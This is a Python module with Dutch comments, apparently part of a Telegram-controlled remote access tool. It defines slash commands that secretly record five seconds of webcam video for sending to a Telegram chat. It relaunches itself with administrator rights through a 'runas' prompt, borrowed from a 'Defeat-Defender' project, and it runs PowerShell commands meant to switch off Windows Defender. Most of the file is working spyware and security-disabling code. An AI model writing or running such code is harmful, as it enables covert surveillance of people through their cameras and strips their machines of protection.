# Deze file bevat alle functies die binnen de async commands uitgevoerd kunnen wordt
import cv2, os, time, subprocess, sys, ctypes


# functie die afgedraaid wordt om de banner te maken
def get_banner() -> str:
    """
    Geeft de ASCII banner terug als string.
    """
    return r"""
  ___               _             
 | _ \_  _ _ _ _ __| |___         
 |  _/ || | '_| '_ \ / -_)        
 |_|  \_,_|_| | .__/_\___|        
  __  __ _    |_|                 
 |  \/  (_)__| | |_ ___ _ _ _ __  
 | |\/| | / _` |  _/ -_) '_| '  \ 
 |_|  |_|_\__,_|\__\___|_| |_|_|_|

=================================
Viresh & Muazma
=================================
"""


# functie die een lijst met alle commands terug geeft
def get_command_list() -> str:
    """
    Geeft een lijst met alle slash commands.
    """
    return r"""
Command Lijst:
/banner         -   ASCII art banner
/webcam         -   opent de webcam
/stopdefender   -   Windows Defender uitgeschakelen
"""


# maak een video recording met de webcam
# source: https://www.geeksforgeeks.org/python/python-opencv-capture-video-from-camera/
def get_camRecording():
    # folder waar de video opgeslagen wordt
    save_dir = './videos'
    os.makedirs(save_dir, exist_ok=True)

    # Bestandsnaam en opslagpad aangeven
    filename = 'output.mp4'
    filepath = os.path.join(save_dir, filename)

    # videoCapture functie: aangeven dat de webcam gebruikt moet/kan worden (camera met index 0)
    cam = cv2.VideoCapture(0)

    # melden en functie stoppen als camera niet geopend kan worden
    if not cam.isOpened():
        return print("Camera kan niet geopend worden!")

    # height en width van de video bepalen
    frame_width = int(cam.get(cv2.CAP_PROP_FRAME_WIDTH))
    frame_height = int(cam.get(cv2.CAP_PROP_FRAME_HEIGHT))

    # VideoWriter object aanmaken om de opname als mp4 op te slaan in de filepath=/video folder
    fourcc = cv2.VideoWriter_fourcc(*'avc1')
    out = cv2.VideoWriter(filepath, fourcc, 20.0, (frame_width, frame_height))

    # zolang de whileloop true is wordt webcam gebruikt om video te maken

    start_time = time.time()
    while True:
        ret, frame = cam.read()

        out.write(frame)

        # als de video langer dan 5 seconden wordt, stop de video
        if time.time() - start_time > 5:
            break

    # als de loop stopt de camera opname afsluiten
    cam.release()
    out.release()
    cv2.destroyAllWindows()

    # return de video/filepath zodat we hierna weten welke video naar de telegram chat verstuurd moet worden
    return filepath


# functie om admin rechten aan te zetten
# Source: https://github.com/witchfindertr/Defeat-Defender-Python-Version-/blob/c2a43b4b2f570b87259ca368a98d2e3ab3572dff/Defeat-Defender.py#L11-L15
def get_adminRights():
    """Maak een terminal open met admin rechten, en sluit de oude (zonder admin rechten)"""
    if sys.argv[-1] != "asadmin":
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([script] + sys.argv[1:] + ['asadmin'])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
        sys.exit(0)

# windows defender uitzetten via python met powershell
def powershell_command(cmd):
    # zet admin rechten aan
    get_adminRights()

    # https://www.phillipsj.net/posts/executing-powershell-from-python/
    # dit is de powershell command die uitgevoerd moet worden (deze command heeft adim rights nodig)
    runCommand = subprocess.run(
        ["powershell", "-Command", cmd], 
        capture_output=True, text=True
    )

    return runCommand.stdout
